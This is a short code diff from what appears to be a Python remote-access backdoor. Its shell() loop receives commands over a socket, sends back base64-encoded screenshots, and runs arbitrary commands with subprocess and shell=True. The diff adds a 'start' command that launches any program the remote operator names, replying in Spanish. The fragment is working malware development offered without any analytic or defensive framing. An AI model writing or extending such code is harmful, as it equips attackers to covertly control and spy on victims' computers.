@@ -54,6 +54,13 @@ def shell():
                 os.remove("monitor-1.png")
             except:
                 cliente.send(base64.b64encode("fail"))
+            
+        elif res[:5] == "start":
+            try:
+                subprocess.Popen(res[6:],shell=True)
+                cliente.send("Programa Iniciado con exito")
+            except:
+                cliente.send("No se pudo iniciar el programa")
 
         else:
             proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
